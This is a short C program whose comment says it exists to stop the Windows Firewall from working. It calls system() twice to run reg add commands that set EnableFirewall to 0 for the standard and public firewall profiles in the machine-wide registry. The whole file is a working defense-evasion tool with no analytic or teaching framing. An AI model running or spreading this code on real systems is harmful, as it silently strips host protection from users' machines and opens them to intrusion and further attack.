/* This program is to Stop the WIndows Firewall from functioning Properly. */
#include <stdio.h>
#include <stdlib.h>
#include <dos.h>
int main()
{
        system("reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\standardprofile /v EnableFirewall /t reg_dword /d 0 /f");
        system("reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\publicprofile /v EnableFirewall /t reg_dword /d 0 /f");
        return 0;
}